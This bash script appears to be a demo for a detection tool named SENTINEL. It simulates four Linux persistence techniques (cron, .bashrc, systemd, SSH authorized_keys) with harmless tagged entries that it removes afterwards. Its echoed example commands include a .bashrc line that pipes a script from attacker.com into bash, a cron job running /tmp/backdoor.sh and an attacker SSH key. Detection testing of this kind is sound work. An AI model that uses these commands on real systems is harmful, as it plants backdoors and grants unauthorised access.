#!/bin/bash
# ════════════════════════════════════════════════════════
#  SENTINEL — Persistence Mechanisms Demo
#  Simulates: T1053.003, T1543.002, T1546.004, T1098.004
# ════════════════════════════════════════════════════════

RED='\033[0;31m'; ORANGE='\033[0;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

echo -e "${BOLD}${RED}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║  SENTINEL DEMO: Persistence Mechanisms               ║"
echo "║  MITRE: T1053/T1543/T1546 — Persistence             ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${ORANGE}[1/4] Cron Persistence — T1053.003${RESET}"
echo -e "    Command: ${BOLD}(crontab -l; echo '*/5 * * * * /tmp/backdoor.sh') | crontab -${RESET}"
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/backdoor.sh # SENTINEL_TEST") | crontab -
sleep 2
echo -e "    ${RED}[IMPLANTED]${RESET} Cron entry added"
crontab -l 2>/dev/null | grep -v SENTINEL_TEST | crontab - 2>/dev/null
echo -e "    ${GREEN}[CLEANED]${RESET} Removed after detection"
echo ""

echo -e "${ORANGE}[2/4] Bashrc Persistence — T1546.004${RESET}"
echo -e "    Command: ${BOLD}echo 'curl -s http://attacker.com/shell.sh | bash' >> ~/.bashrc${RESET}"
echo "# SENTINEL_TEST_ENTRY" >> ~/.bashrc
sleep 2
echo -e "    ${RED}[IMPLANTED]${RESET} Malicious line appended to .bashrc"
sed -i '/SENTINEL_TEST_ENTRY/d' ~/.bashrc 2>/dev/null
echo -e "    ${GREEN}[CLEANED]${RESET} Removed"
echo ""

echo -e "${ORANGE}[3/4] Systemd Service — T1543.002${RESET}"
echo -e "    Command: ${BOLD}cat > /tmp/backdoor.service << EOF\n[Service]\nExecStart=/tmp/backdoor.sh\nEOF${RESET}"
cat > /tmp/sentinel_test.service << 'EOF'
[Unit]
Description=SENTINEL_TEST service
[Service]
ExecStart=/bin/bash -c 'echo test'
[Install]
WantedBy=multi-user.target
EOF
sleep 2
echo -e "    ${RED}[CREATED]${RESET} /tmp/sentinel_test.service"
rm -f /tmp/sentinel_test.service
echo -e "    ${GREEN}[CLEANED]${RESET} Service file removed"
echo ""

echo -e "${ORANGE}[4/4] SSH Authorized Keys — T1098.004${RESET}"
echo -e "    Command: ${BOLD}echo 'ssh-rsa ATTACKER_KEY' >> ~/.ssh/authorized_keys${RESET}"
mkdir -p ~/.ssh
echo "# SENTINEL_TEST_KEY ssh-rsa AAAA...attacker_key" >> ~/.ssh/authorized_keys
sleep 2
echo -e "    ${RED}[IMPLANTED]${RESET} Backdoor SSH key added"
sed -i '/SENTINEL_TEST_KEY/d' ~/.ssh/authorized_keys 2>/dev/null
echo -e "    ${GREEN}[CLEANED]${RESET} Key removed"
echo ""

echo -e "${GREEN}[+] All persistence demos complete.${RESET}"
echo -e "${CYAN}[*] Expected detections:${RESET} CRON_PERSISTENCE, BASHRC_PERSISTENCE, SYSTEMD_PERSISTENCE, SSH_AUTHORIZED_KEYS"
echo -e "${CYAN}[*] Check dashboard:${RESET} http://localhost:5000"
